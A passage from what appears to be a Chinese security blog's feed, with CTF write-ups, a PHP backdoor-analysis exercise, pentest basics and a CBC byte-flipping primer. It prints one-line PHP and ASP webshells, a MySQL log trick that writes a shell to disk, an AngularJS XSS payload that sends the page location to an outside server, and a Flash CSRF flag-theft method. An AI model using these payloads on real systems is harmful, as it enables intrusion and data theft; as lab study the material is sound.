href="http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。" target="_blank" rel="external">http://101.71.29.5:10001/admin/中需要管理员权限才能看到flag。我们已知后台的爬虫会带着管理员的session_id来打开flag的页面，当后台的爬虫打开这个图像的时候。会跳转到我们的服务器地址，与此同时会加载object标签内嵌的flash，flash会利用CSRF打开http://101.71.29.5:10001/admin/将flag打回我们的服务器。</a></strong></p><h6 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h6><p><strong>其实这道题原理是最重要的，复现的话利用的是别人写的东西，没有什么太大意义。</strong></p><p>下载项目中的文件，将<code>ContentHijacking.swf</code>文件头改为ZWS然后后缀改为jpg上传到服务器，记录文件路径。<strong>(windows编辑器改的文件不能复现成功，某表哥说他windows上我软件全试过，没用。只有mac的hex friend可以，这就很奇怪了。)</strong></p><p>然后在<code>ContentHijackingLoader.html</code>125行加上你vps的地址，保存传到你的vps上。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-bc47b3e7e188f0de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><p>在你的vps上打开<code>ContentHijackingLoader.html</code>，第一个填写开始时候上传的jpg文件地址，下面填写要攻击的URL地址。然后生成payload。<br><a href="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-a9a778bfc1351f30.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></a></p><p>把payload写进个人网站提交，后台爬虫会访问这个payload。然后在你的vps日志里面就能看到打回来的<a href="http://101.71.29.5:10001/admin/%E4%B8%AD%E7%9A%84flag%E3%80%82" target="_blank" rel="external">http://101.71.29.5:10001/admin/中的flag。</a><br><a href="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" target="_blank" rel="external"><img src="https://upload-images.jianshu.io/upload_images/9113969-becf6d50182c16e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0x00-F5刷新"><a href="#0x00-F5刷新" class="headerlink" title="0x00 F5刷新"></a>0x00 F5刷新</h3><p>拿到一个图片一闪而过</p><p>根据提示想到F5刷新隐写</p><pre><code>首先下载F5解密的代码：https://github.com/matthewgao/F5-steganography切换到改目录下：cd F5-steganography继续运行命令：java Extract  E:\CTF\安恒月赛7\5b51807ba55b4\Misc.jpg然后会生成output.txt文件</code></pre><p>有密码</p><p>使用zipcenop打开看看可以解密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261455_536.png" alt=""></p><p>伪加密</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261455_593.png" alt=""></p><p>实际上修改把01改成00就可</p><p>flag{96efd0a2037d06f34199e921079778ee}</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807242216_34.png" alt=""></p><h3 id="0x01-弱口令"><a href="#0x01-弱口令" class="headerlink" title="0x01 弱口令"></a>0x01 弱口令</h3><p>…. . .-.. .-.. —– ..-. — .-. ..- – </p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807261343_275.png" alt=""></p><p>… . .-.. .-.. —– ..-. — .-. ..- —</p><p><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="external">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p><p>HELL0FORUM</p><p>图片拿出来 stegsolve感觉可能是lsb隐写</p><pre><code>python lsb.py extract 女神.png  1.txt 123456</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒杯7月&quot;&gt;&lt;a href=&quot;#安恒杯7月&quot; class=&quot;headerlink&quot; title=&quot;安恒杯7月&quot;&gt;&lt;/a&gt;安恒杯7月&lt;/h1&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://mang0.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>墨者学院php代码审计1</title>
    <link href="http://mang0.me/archives/8395d5c7/"/>
    <id>http://mang0.me/archives/8395d5c7/</id>
    <published>2018-08-25T12:32:48.000Z</published>
    <updated>2018-10-15T00:40:51.593Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP代码分析溯源-第1题"><a href="#PHP代码分析溯源-第1题" class="headerlink" title="PHP代码分析溯源(第1题)"></a>PHP代码分析溯源(第1题)</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>某日，在某公司做IT维护的朋友给安全工程师”墨者”发了一个PHP文件，说在其WEB服务器发现多了一个b.php文件，目前不确定这个文件是开发留下的正常文件还是攻击者上传的木马后门，希望”墨者”能够帮他分析一下。 </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>访问<a href="http://219.153.49.228:45070/" target="_blank" rel="external">http://219.153.49.228:45070/</a></p><pre><code class="php">&lt;?php @$_++;$__=(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;}&quot;).(&quot;%&quot;^&quot;`&quot;).(&quot;{&quot;^&quot;/&quot;);$___=(&quot;$&quot;^&quot;{&quot;).(&quot;~&quot;^&quot;.&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;-&quot;^&quot;~&quot;).(&quot;(&quot;^&quot;|&quot;);${$__}[!$_](${$___}[$_]); ?&gt;</code></pre><p>运行下，报错。 </p><p>$_ =&gt; 1</p><p>$__ =&gt; _GET</p><p>$___ =&gt; _POST</p><p>然后观察最后一行代码，把我们变量给用值替换进去</p><pre><code>${_GET}[!1](${_POST}[1]);</code></pre><p>把多余的{}去掉 [!1]也就是[0]，整理下代码是这样的</p><pre><code>$_GET[0]($_POST[1]);</code></pre><p>和一句话的</p><pre><code>$_POST[1]</code></pre><p>传参差不多了，那么</p><pre><code>$_GET[0]</code></pre><p>就是我们的函数名了</p><p>根据”b.php源码”提示去b.php目录下</p><p>用hackbar传GET和POST请求</p><p><a href="http://219.153.49.228:45070/b.php?0=assert" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert</a></p><p>1=phpinfo()</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807221443_103.png" alt=""></p><p>在菜刀里写<a href="http://219.153.49.228:45070/b.php?0=assert密码是1" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=assert密码是1</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201807221450_724.png" alt=""></p><h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>这里有一个问题在于</p><p><a href="http://219.153.49.228:45070/b.php?0=eval" target="_blank" rel="external">http://219.153.49.228:45070/b.php?0=eval</a></p><p>无法显示phpinfo</p><p>这里延伸出一个问题<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="external">柠檬大大的文章</a>解释的很好</p><p>问题出在</p><p><code>$_POST[&#39;1&#39;]()</code>这是一个<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a>,这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括<strong>回调函数</strong>，函数表在内的一些用途。 </p><p>但是eval不能被可变函数 调用。 </p><blockquote><p><a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="external">mixed</a> <strong>eval</strong> ( string <code>$code</code> ) </p><p><strong>Note</strong>: 因为是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="external">可变函数</a> 调用。 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;PHP代码分析溯源-第1题&quot;&gt;&lt;a href=&quot;#PHP代码分析溯源-第1题&quot; class=&quot;headerlink&quot; title=&quot;PHP代码分析溯源(第1题)&quot;&gt;&lt;/a&gt;PHP代码分析溯源(第1题)&lt;/h2&gt;&lt;h3 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; c
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://mang0.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP字符串&#39;和“区别</title>
    <link href="http://mang0.me/archives/d8be4236/"/>
    <id>http://mang0.me/archives/d8be4236/</id>
    <published>2018-08-25T12:22:01.000Z</published>
    <updated>2018-10-15T00:40:51.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP字符串’和“区别"><a href="#PHP字符串’和“区别" class="headerlink" title="PHP字符串’和“区别"></a>PHP字符串’和“区别</h1><p>在PHP语言里，如果一个字符串是用单引号做定义的，</p><p>比如： <code>&#39;$demo&#39;</code>，那么不管这个字符串中间有什么，php都会原样输出。 而如果一个字符串用双引号做定义，那么，php在输出结果之前，先扫描这个字符串，如果遇到 <code>$</code>为开头的，会认为这是个变量，并尝试将 变量 的 值 替换这个变量后，输出。 </p><p>举例如下：      </p><pre><code>&lt;?php$mang0 = &#39;123&#39;;$demo =&quot;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$mang0&lt;/p&gt;&quot;;echo $demo;?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201808252008_139.png" alt=""></p><p>遇到 <code>$mang0</code>为开头，寻找变量带入输出。</p><pre><code class="php">&lt;?php$mang0 = &#39;123&#39;;$demo =&#39;&lt;p&gt;ctf&lt;/p&gt; &lt;p&gt;$mang0&lt;/p&gt;&#39;;echo $demo;?&gt;</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201808252012_584.png" alt=""> </p><p>直接输出</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP字符串’和“区别&quot;&gt;&lt;a href=&quot;#PHP字符串’和“区别&quot; class=&quot;headerlink&quot; title=&quot;PHP字符串’和“区别&quot;&gt;&lt;/a&gt;PHP字符串’和“区别&lt;/h1&gt;&lt;p&gt;在PHP语言里，如果一个字符串是用单引号做定义的，&lt;/p&gt;
&lt;p&gt;比
      
    
    </summary>
    
      <category term="代码审计" scheme="http://mang0.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://mang0.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试基础</title>
    <link href="http://mang0.me/archives/35d3b1d4/"/>
    <id>http://mang0.me/archives/35d3b1d4/</id>
    <published>2018-08-01T15:43:32.000Z</published>
    <updated>2018-10-15T00:40:51.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><h2 id="0x00熟悉各类名词"><a href="#0x00熟悉各类名词" class="headerlink" title="0x00熟悉各类名词"></a>0x00熟悉各类名词</h2><p>黑客：Hacker 黑客所做的不是恶意破坏，他们是一群纵横网络上的技术人员，热衷与科技探索、计算机科学研究。在IT圈中，Hacker一词无疑是带有正面意义的。<br>骇客：Cracker 骇客未必具有很高的技术，通常用一些简单的手段去达到一些炫耀、恶作剧、搞破坏的目的。<br>红客：Honcker Honcker用自己的技术维护国内网络安全，并对外来的一切进攻进行还击。他们拥有爱国、正义、进取的精神，是网络安全时代的英雄的代表。</p><p>白帽： 专门研究或者从事网络安全行业的人，通常受雇于各大安全公司，是提高网络、系统安全水平的主要力量。</p><p>黑帽： 专门研究木马、操作系统，寻找漏洞，并且以个人意志为出发点，攻击网络或者计算机。<br>灰帽： 以个人意志为出发点，两者皆可做。</p><h2 id="0x01术语词汇"><a href="#0x01术语词汇" class="headerlink" title="0x01术语词汇"></a>0x01术语词汇</h2><p>脚本(asp、php、jsp)<br>html(css、js、html)<br>HTTP协议<br>CMS(B/S)<br>MD5<br>肉鸡： 被黑客入侵并长期驻扎的计算机或服务器。<br>抓鸡： 利用使用量大的程序的漏洞，使用自动化方式获取。<br>Webshell： 通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。<br>漏洞: 硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p><p>一句话木马： 通过向服务器端提交一句简短的代码，配合本地客户端实现webshell功能的木马。</p><p>&lt;%eval request(&quot;pass&quot;)%&gt;<br>&lt;%execute(request(&quot;pass&quot;))%&gt;<br>request(“pass”)：接收客户端提交的数据。pass为执行命令的参数。<br>eval/execute：函数执行客户端命令的内容。<br>提权： 操作系统低权限的账户将自己提升为管理员权限使用的方法。</p><p>后门： 黑客为了对住基金向长期的控制，在机器上种植的一段程序或者留下的一个“入口”。</p><p>跳板： 使用肉鸡IP来实施攻击其他目标，以便更好地隐藏自己的身份信息。</p><p>旁站入侵： 即同服务器下的网站入侵，入侵之后可以通过提权跨目录等手段拿到目标网站的权限。常见的旁站查询工具有：WebRobot、御剑、明小子和web在线查询等。</p><p>C段入侵： 即同C段下服务器入侵。如目标ip为192.168.1.253，入侵192.168.1.*的任意一台机器，然后利用一些黑客工具嗅探获取在网络上传输的各种信息。常用的工具有：在windows下有Cain，在UNIX环境下有Sniffit，Snoop，Tcpdump，Dsniff等。</p><p>C段技巧 :</p><p>1.扫描1-255全部网段的网站CMS情况<br>选择一款自己擅长入侵的cms，这样才能更快速的实现C段入侵<br>2.扫描1-255全部网段的端口开放情况<br>先查询端口，选择自己擅长提权的端口的网站来入侵，通过端口提权。使用到的工具椰树、阿D网络工具包</p><h2 id="0x02渗透测试"><a href="#0x02渗透测试" class="headerlink" title="0x02渗透测试"></a>0x02渗透测试</h2><p><strong>黑盒测试</strong>： 在未授权的情况下，模拟黑客的攻击方法和思维方式，来评估计算机网络系统可能存在的安全风险。 黑盒测试不同于黑客入侵，并不等于黑站。黑盒测试考验的是综合的能力（OS、Database、Script、code、思路、社工） 思路与经验积累往往决定成败。 三个臭皮匠赛过诸葛亮。<br><strong>白盒测试</strong> ： 相对黑盒测试，白鹤测试基本是从内部发起。 黑百合的另一种说法： 知道源代码和不知道源代码的渗透测试。 这时，黑盒测试还是传统的渗透测试，而白盒测试就偏向于代码审计。</p><p><strong>灰盒测试</strong>：基于白盒与黑盒测试之间的一种产物。 </p><p><strong>APT攻击</strong>：Advanced Persistent Threat 高级可持续性攻击，是指组织（特别是政府）或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。<br>1.极强的隐蔽性<br>2.潜伏期长，持续性强<br>3.目标性强<br><strong>渗透测试的特点：</strong><br>充满挑战与刺激——不达目的不罢休<br>思路与经验累计往往决定成败</p><p><strong>渗透测试与入侵的最大的区别：</strong><br>渗透测试：更全面的找出服务器的问题，更倾向于保护。<br>入侵：不择手段地（甚至是具有破坏性的）拿到权限。</p><h2 id="0x03渗透测试一般流程："><a href="#0x03渗透测试一般流程：" class="headerlink" title="0x03渗透测试一般流程："></a>0x03渗透测试一般流程：</h2><p>明确目标》信息收集》漏洞探测》漏洞验证》信息分析 》获取所需》信息整理》 形成报告</p><p>1.明确目标：<br>确定范围<br>确定规则<br>确定需求<br>2.信息收集：<br>基础信息<br>系统信息<br>应用信息<br>版本信息<br>服务信息<br>人员信息<br>防护信息<br>3.漏洞探测：<br>系统漏洞<br>WebServer漏洞<br>Web应用漏洞<br>其他端口服务漏洞<br>通信安全<br>4.漏洞验证：<br>自动化验证<br>手工验证<br>试验验证<br>登录猜解<br>业务漏洞验证<br>公开资源的利用<br>5.信息分析<br>精准打击<br>绕过防御机制<br>定制攻击路径<br>绕过检测机制<br>攻击代码<br>6.获取所需<br>实施攻击<br>获取内部信息<br>进一步渗透<br>持续性存在<br>清理痕迹<br>7.信息整理<br>整理渗透工具<br>整理收集信息<br>整理漏洞信息<br>8.形成报告：<br>按需整理<br>补充介绍<br>修补建议</p><p>经验分享<br>信息搜集是关键<br>做事不要太心急<br>多学习，多看源码<br>平时注意搜集0day<br>思路很重要</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试基础&quot;&gt;&lt;a href=&quot;#渗透测试基础&quot; class=&quot;headerlink&quot; title=&quot;渗透测试基础&quot;&gt;&lt;/a&gt;渗透测试基础&lt;/h1&gt;&lt;h2 id=&quot;0x00熟悉各类名词&quot;&gt;&lt;a href=&quot;#0x00熟悉各类名词&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="渗透测试" scheme="http://mang0.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透" scheme="http://mang0.me/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>八月展望</title>
    <link href="http://mang0.me/archives/80e1beed/"/>
    <id>http://mang0.me/archives/80e1beed/</id>
    <published>2018-08-01T15:41:26.000Z</published>
    <updated>2018-10-15T00:40:51.592Z</updated>
    
    <content type="html"><![CDATA[<p>不要自己感动自己</p><p>不要过于享受生活</p><p>八月了，八月还会是如此的散漫自由么，生活确实不是一帆丰顺，社会上的尔虞吾诈也都心酸体验了一把。</p><p>八月了，希望自己静下心来，认真的做自己的计划，世界的另一番风景只有站的最够高才能看清，太低了琐事缠身，总想超脱，痛恨无能摆脱。</p><p>八月了，时间慢一点吧，目标定实际一点吧，能尽力碰到就好。人总是有些好高骛远，飞的太高太不真实，落下就残忍。</p><p>八月，祝能实现理想，静候佳音。完成flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;不要自己感动自己&lt;/p&gt;
&lt;p&gt;不要过于享受生活&lt;/p&gt;
&lt;p&gt;八月了，八月还会是如此的散漫自由么，生活确实不是一帆丰顺，社会上的尔虞吾诈也都心酸体验了一把。&lt;/p&gt;
&lt;p&gt;八月了，希望自己静下心来，认真的做自己的计划，世界的另一番风景只有站的最够高才能看清，太低了琐事缠身
      
    
    </summary>
    
      <category term="思考" scheme="http://mang0.me/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="思考" scheme="http://mang0.me/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>2018SCTF-wp</title>
    <link href="http://mang0.me/archives/f4e3f3ec/"/>
    <id>http://mang0.me/archives/f4e3f3ec/</id>
    <published>2018-06-20T14:40:40.000Z</published>
    <updated>2018-10-15T00:40:51.559Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sctf"><a href="#sctf" class="headerlink" title="sctf"></a>sctf</h1><p>被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202236_554.png" alt=""></p><p>[TOC]</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><h3 id="侧信道初探"><a href="#侧信道初探" class="headerlink" title="侧信道初探"></a>侧信道初探</h3><p>以下图为例，使用 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。<br><img src="https://i.imgur.com/yPJvv6u.png" alt="SPA图示"><br><img src="https://i.imgur.com/ogzPrtK.png" alt=""></p><p>SCTF{0110111010}</p><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>modbus协议<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191825_719.png" alt=""><br>接下来tcp流追踪<br>搜索sctf未果<br>继续慢慢寻找<br><img src="http://oy0tigw51.bkt.clouddn.com/201806191816_523.png" alt=""><br>SCTF{Easy_Mdbus}</p><p><img src="" alt="Uploading file..._wk2cyf491"></p><h3 id="神秘的交易"><a href="#神秘的交易" class="headerlink" title="神秘的交易"></a>神秘的交易</h3><p>logicdata拖进Logic里面,分析嗅探得到的波形图</p><p><img src="https://i.imgur.com/fvQUPGz.png" alt=""></p><p>0x400x310x10</p><p>SCTF{403110}</p><h3 id="肥宅快乐题"><a href="#肥宅快乐题" class="headerlink" title="肥宅快乐题"></a>肥宅快乐题</h3><p>使用硕思闪客精灵 反编译flash</p><p>在动作一栏寻找得到一段会话</p><p>得到</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202141_189.png" alt=""></p><p>U1lDe0YzaVpoYWlfa3U0aWxlX1QxMTF9</p><p>base64解码</p><p>SYC{F3iZhai_ku4ile_T111}</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="新的建议板"><a href="#新的建议板" class="headerlink" title="新的建议板"></a>新的建议板</h3><p>右键查看源码得到 AngularJS 版本1.4.6<br>模板注入<br><a href="https://www.anquanke.com/post/id/86093" target="_blank" rel="external">https://www.anquanke.com/post/id/86093</a><br><a href="http://seaii-blog.com/index.php/2017/09/02/68.html" target="_blank" rel="external">http://seaii-blog.com/index.php/2017/09/02/68.html</a></p><pre><code>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);eval(atob(`dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xNjUuMjI3LjU4LjEwOTo4ODg4Lz9sb2NhdGlvbj0nK2RvY3VtZW50LmxvY2F0aW9uLmhyZWY7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTs=`));alert(3);//');}}</code></pre><p>本地可以xss，vps收不到bot的请求</p><h3 id="easiest-web-phpmyadmin"><a href="#easiest-web-phpmyadmin" class="headerlink" title="easiest web - phpmyadmin"></a>easiest web - phpmyadmin</h3><p>参照了网上的文章利用日志的方法写入shell</p><p>思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接</p><p>首先查看本地的写shell地址</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202056_350.png" alt=""></p><p>SET global general_log_file=’D:/phpStu/WWW/shell.php’;</p><p>select “&lt;?php @eval($_POST[‘shell’]);?&gt;”; </p><p><img src="http://oxskavewj.bkt.clouddn.com/3nahv80ilqe61q1enu4zprhu59.png" alt=""></p><p>shell连上进入c盘获取flag</p><p><img src="http://oxskavewj.bkt.clouddn.com/2p45t2wakukp40nuieu4wv1q3e.png" alt=""></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="Script-In-Script"><a href="#Script-In-Script" class="headerlink" title="Script In Script"></a>Script In Script</h3><p>本来想着写脚本爆破的，考虑到时间的原因采用了取巧的方法，因为flag的很多字符都是可以看代码写出来的，所以本地把js先解密了，搭了一个环境，根据js的变量值进行测试</p><p><img src="http://oxskavewj.bkt.clouddn.com/cgb8jdo2whkqex0ndrl65y2tq3.png" alt=""></p><p>flag:sctf{5cr1Pt_In_ScrIpT!!}</p><h3 id="Where-is-my-13th-count？"><a href="#Where-is-my-13th-count？" class="headerlink" title="Where is my 13th count？"></a>Where is my 13th count？</h3><p>题目要求是让白球吃到13个黄色方块得到13分，但是一共只有12个能吃<br>使用相关调试软件发现游戏会闪退，判断有反调试<br>根据suctf的一道题目</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202212_643.png" alt=""></p><p>分析Cheat Engine_Data\Managed下的Assembly-CSharp.dll文件，反调试都在这个dll文件下完成<br>发现了这些东西</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_821.png" alt=""></p><p>交叉分析找到反调试函数然后直接patch<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_351.png" alt=""><br>使用游戏辅助神器Cheat Engine修改游戏的分数内存即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_393.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201806202211_208.png" alt=""></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="it-may-contain-‘flag"><a href="#it-may-contain-‘flag" class="headerlink" title="it may contain ‘flag"></a>it may contain ‘flag</h3><p>低解密指数攻击</p><pre><code class="pp">import gmpy2import timedef continuedFra(x, y):    cF = []    while y:        cF += [x / y]        x, y = y, x % y    return cFdef Simplify(ctnf):    numerator = 0    denominator = 1    for x in ctnf[::-1]:        numerator, denominator = denominator, x * denominator + numerator    return (numerator, denominator)def calculateFrac(x, y):    cF = continuedFra(x, y)    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))    return cFdef solve_pq(a, b, c):    par = gmpy2.isqrt(b * b - 4 * a * c)    return (-b + par) / (2 * a), (-b - par) / (2 * a)def wienerAttack(e, n):    for (d, k) in calculateFrac(e, n):        if k == 0: continue        if (e * d - 1) % k != 0: continue        phi = (e * d - 1) / k        p, q = solve_pq(1, n - phi + 1, n)        if p * q == n:            return abs(int(p)), abs(int(q))    print &#39;not find!&#39;time.clock()n = 0x1fb18fb44f4449f45ea938306c47b91f64b6c176bd24dbb35aa876f73859c90f0e1677d07430a1188176bc0b901ca7b01f6a99a7df3aec3dd41c3d80f0d17292e43940295b2aa0e8e5823ffcf9f5f448a289f2d3cb27366f907ee62d1aaeba490e892dc69dacbafa941ab7be809e1f882054e26add5892b1fcf4e9f1c443d93bfe = 0xe42a12145eaa816e2846200608080305c99468042450925789504307cbc54a20ed7071b68b067b703a1679d861795542f8cbd2d1cb4d3847d0940cac018cdb0fa729571afbe10c1b8be2dd8acd99ee48b77d53c435b9c2fed59e12e02ad8cfc2bcc46ad85534c266dcc1f3a1a03d87118eaf3f5b3eeeb3be84ad023a4bf34939c = 0xd19d63015bdcb0b61824237b5c67cb2ef09af0c6cd30e193ff9683357b1e45ab4df607b8c1e0b96cafc49a84d7e655c3ce0f71b1d217eec9ca6cdfa57dd3dc92533b79431aa8a7d6ca67ac9cdd65b178a5a96ab7ce7bf88440f4a9b9d10151b0c942a42fdab9ea2c2f0c3706e9777c91dcc9bbdee4b0fb7f5d3001719c1dd3d3p, q = wienerAttack(e, n)print &#39;[+]Found!&#39;print &#39;  [-]p =&#39;,pprint &#39;  [-]q =&#39;,qprint &#39;  [-]n =&#39;,p*qd = gmpy2.invert(e,(p-1)*(q-1))print &#39;  [-]d =&#39;, dprint &#39;  [-]m is:&#39; + &#39;{:x}&#39;.format(pow(c,d,n)).decode(&#39;hex&#39;)print &#39;\n[!]Timer:&#39;, round(time.clock(),2), &#39;s&#39;print &#39;[!]All Done!&#39;print n```</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sctf&quot;&gt;&lt;a href=&quot;#sctf&quot; class=&quot;headerlink&quot; title=&quot;sctf&quot;&gt;&lt;/a&gt;sctf&lt;/h1&gt;&lt;p&gt;被虐杀，web明年再战，感谢小组四人的努力，缺一个都是不完整的。加油！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://oy
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="WP" scheme="http://mang0.me/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>cbc字节翻转攻击</title>
    <link href="http://mang0.me/archives/2947d8f2/"/>
    <id>http://mang0.me/archives/2947d8f2/</id>
    <published>2018-05-31T16:47:50.000Z</published>
    <updated>2018-10-15T00:40:51.577Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h1><h2 id="CBC原理"><a href="#CBC原理" class="headerlink" title="CBC原理"></a>CBC原理</h2><p> <img src="http://oy0tigw51.bkt.clouddn.com/201805201723_856.jpg" alt=""></p><h2 id="对cbc的攻击"><a href="#对cbc的攻击" class="headerlink" title="对cbc的攻击"></a>对cbc的攻击</h2><p><img src="http://oy0tigw51.bkt.clouddn.com/201805201725_862.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805201726_48.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201805202259_97.png" alt=""></p><h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>　　我们举例说明一下这个例子，这里有一个明文序列：</p><pre><code>a:2:{s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &#39;Hello sdsdsd!&#39;&quot;;}</code></pre><p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p><pre><code>- Block 1:a:2:{s:4:&quot;name&quot;; - Block 2:s:6:”sdsdsd”;s:8- Block 3::”greeting”;s:20- Block 4::”echo ‘Hello sd- Block 5:sdsd!’”;}</code></pre><p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　